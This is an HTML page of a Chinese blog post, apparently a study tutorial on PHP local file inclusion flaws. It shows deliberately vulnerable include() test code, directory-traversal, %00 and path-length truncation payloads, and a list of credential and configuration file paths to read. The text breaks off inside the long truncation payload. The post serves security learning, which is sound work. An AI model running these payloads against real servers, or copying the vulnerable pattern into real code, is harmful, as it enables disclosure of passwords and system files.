@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>文件包含漏洞学习笔记（未完） | T0mrvvi1b3t‘s blog</title><meta name="keywords" content="文件包含"><meta name="author" content="T0mrvvi1b3t"><meta name="copyright" content="T0mrvvi1b3t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="文件包含函数PHP中文件包含函数有以下四种： 123456789require()require_once()include()include_once()    &#x2F;&#x2F;具体用法自行百度  include和require区别主要是：include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞学习笔记（未完）">
+<meta property="og:url" content="http://t0mrvvi1b3t.top/2021/04/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="T0mrvvi1b3t‘s blog">
+<meta property="og:description" content="文件包含函数PHP中文件包含函数有以下四种： 123456789require()require_once()include()include_once()    &#x2F;&#x2F;具体用法自行百度  include和require区别主要是：include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_o">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.vim-cn.com/a0/e44964f84a1e9df793e1bfb7f265d0fbe1454d.jpg">
+<meta property="article:published_time" content="2021-04-28T18:43:14.664Z">
+<meta property="article:modified_time" content="2021-07-18T05:13:17.330Z">
+<meta property="article:author" content="T0mrvvi1b3t">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.vim-cn.com/a0/e44964f84a1e9df793e1bfb7f265d0fbe1454d.jpg"><link rel="shortcut icon" href="https://img.vim-cn.com/86/fc3fd860a6269f1834928642dd8462bc5b93be.jpg"><link rel="canonical" href="http://t0mrvvi1b3t.top/2021/04/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":false,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-18 13:13:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://ss2.baidu.com/6ON1bjeh1BF3odCf/it/u=2706720867,592915881&amp;fm=27&amp;gp=0.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.vim-cn.com/a0/e44964f84a1e9df793e1bfb7f265d0fbe1454d.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">T0mrvvi1b3t‘s blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件包含漏洞学习笔记（未完）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-28T18:43:14.664Z" title="发表于 2021-04-29 02:43:14">2021-04-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-18T05:13:17.330Z" title="更新于 2021-07-18 13:13:17">2021-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E6%BC%8F%E6%B4%9E/">web漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件包含漏洞学习笔记（未完）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+
+
+<h4 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h4><p>PHP中文件包含函数有以下四种：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment">//具体用法自行百度</span></span><br></pre></td></tr></table></figure>
+
+<p><code>include</code>和<code>require</code>区别主要是：<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次且你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题的情况。</p>
+<h4 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h4><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含了其他恶意文件，导致执行了非预期的代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]参数开发者没有经过严格的过滤，直接带入了<span class="keyword">include</span>的函数，攻击者可以修改<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]的值，执行非预期的操作。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>条件:</p>
+<ol>
+<li>allow_url_fopen=On</li>
+<li>变量是可以人为控制的</li>
+</ol>
+<p>方法:</p>
+<ol>
+<li>尝试随便读一个文件观察报错得到路径（./当前路径，../跳转上一目录来读取文件）</li>
+</ol>
+<h4 id="无限制本地文件包含漏洞"><a href="#无限制本地文件包含漏洞" class="headerlink" title="无限制本地文件包含漏洞"></a>无限制本地文件包含漏洞</h4><p>test代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;password                                     &#x2F;&#x2F;通过目录遍历来读取其他文件夹内的文件</span><br></pre></td></tr></table></figure>
+
+<p>常见敏感信息路径:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br><span class="line"></span><br><span class="line">linux&#x2F;unix:</span><br><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h4><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26090065/article/details/81458937"><strong>%00截断</strong></a></h5><p>条件：</p>
+<p>​        magic_quotes_gpc = Off      php版本&lt;5.3.4</p>
+<p>test代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php%00</span><br></pre></td></tr></table></figure>
+
+<h5 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a><strong>路径长度截断</strong></h5><p>条件：</p>
+<p>​        windows OS，点号需要长于256；linux OS 长于4096</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line"></span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
+
+<p>test代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:filename&#x3D;test.txt&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#